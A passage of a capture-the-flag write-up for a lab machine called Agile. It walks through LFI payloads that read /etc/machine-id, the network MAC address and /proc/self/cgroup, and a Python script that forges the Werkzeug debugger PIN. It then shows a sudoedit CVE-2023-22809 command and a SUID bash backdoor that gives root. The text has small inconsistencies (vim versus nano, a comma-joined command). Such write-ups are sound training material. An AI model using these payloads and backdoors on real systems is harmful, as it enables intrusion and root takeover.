### Werkzeug Debugger Console Pin

By intercepting and forwarding we trigger a 500 error.

![](/assets/img/agile/Pasted_image_20261005081752.png)

We see that the path **/app/venv/lib/python3.10/site-packages/flask/app.py** exists, then we'll try to collect more information like the machine-id to do the **Werkzeug Debugger Console Pin**, with the following lfi payload **../../../etc/machine-id**

![](/assets/img/agile/Pasted_image_20261005081851.png)

`machine-id:ed5b159560f54721827644bc9b220d00`

Then we'll need the MAC Address of the active network interface (in decimal format) we'll use the following lfi payload **/download?fn=../../../sys/class/net/eth0/address** and then use python to transform it to decimal.

![](/assets/img/agile/Pasted_image_20261005082047.png)

`a2:de:ad:00:b4:1d`

We remove the dots and use python to convert it to decimal.

```python
python
>>> print(0xa2dead00b41d)
179077268943901
```

We also need the cgroup, we'll use the following lfi payload **/download?fn=../../../proc/self/cgroup**

![](/assets/img/agile/Pasted_image_20261005082751.png)

With all this data we'll make a script called **werkzeug_pin.py**.

```python
import hashlib
from itertools import chain

# 1. Public bits
probably_public_bits = [
    'www-data', 
    'flask.app',
    'wsgi_app', # Crucial adjustment for Agile
    '/app/venv/lib/python3.10/site-packages/flask/app.py' 
]

# 2. Private bits
private_bits = [
    '179077268943901', 
    'ed5b159560f54721827644bc9b220d00superpass.service' # Concatenated machine-id + cgroup suffix
]

# Werkzeug PIN generation algorithm
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

num = None
if num is None:
    h.update(b'pinsalt')
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = []
for group_size in (3, 3, 3):
    rv.append(num[0:group_size])
    num = num[group_size:]
print("-".join(rv))
```

### CVE-2023-22809

This vulnerability lets you inject environment variables (like `EDITOR`) to bypass the original target file and open any other file the target user (`dev_admin`) has write access to.

The key target file on this system is the Python virtual environment activation script: `/app/venv/bin/activate`. This file is executed periodically (like a scheduled process or cronjob) by the **root** user.

To edit this file taking advantage of the flaw, run the following command:

```bash
EDITOR="vim -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/config_test.json
```

![](/assets/img/agile/Pasted_image_20261006053516.png)

When the text editor (`nano`) opens, you'll be directly editing `/app/venv/bin/activate`. At the end of the file, add a line to assign SUID permissions to the terminal `cp /bin/bash /tmp/kali, chmod 4777 /tmp/kali`

![](/assets/img/agile/Pasted_image_20261006054107.png)

After a few minutes we run /tmp/kali -p and we'll already be in the root group.

![](/assets/img/agile/Pasted_image_20261006054224.png)

We capture the root.txt

### Summary

**Attack Chain:**

1. **Web Enumeration** → Found SuperPass, a password vault with registration enabled
2. **Export Interception** → Burp Suite revealed `/download?fn=...` parameter, potential LFI, Flask Debug mode active
3. **Environment Leak** → Read `/proc/self/environ` via LFI, confirmed www-data as the running user
4. **500 Error Trigger** → Forwarded a request to crash the app and expose the Werkzeug debugger path
5. **PIN Ingredient Collection** → LFI'd `/etc/machine-id`, the eth0 MAC address, and `/proc/self/cgroup`
6. **Werkzeug PIN Cracking** → Built the console PIN offline from collected values with a Python script
7. **RCE via Debug Console** → Authenticated to the Werkzeug console, executed a Python reverse shell as www-data
8. **Credential Discovery** → Found MySQL credentials in `config_prod.json`, enumerated password hashes for user corum
9. **SSH Access** → Cracked corum's password via netexec password list, connected over SSH, captured user.txt
10. **Port Discovery** → No sudo rights; found a Chrome instance listening locally on port 41829
11. **Port Forwarding** → SSH local forward exposed Chrome DevTools, revealing a hidden subdomain (test.superpass.htb) with a logged-in session
12. **Lateral Movement** → Found edward's vault credentials, switched user with `su`, enumerated sudo rights
13. **CVE-2023-22809 Exploitation** → Abused `EDITOR` environment variable injection in `sudoedit` to edit `/app/venv/bin/activate` (run periodically by root) as dev_admin
14. **Root via SUID Backdoor** → Appended a command to copy bash and set SUID, waited for the cronjob, executed `/tmp/kali -p` for a root shell
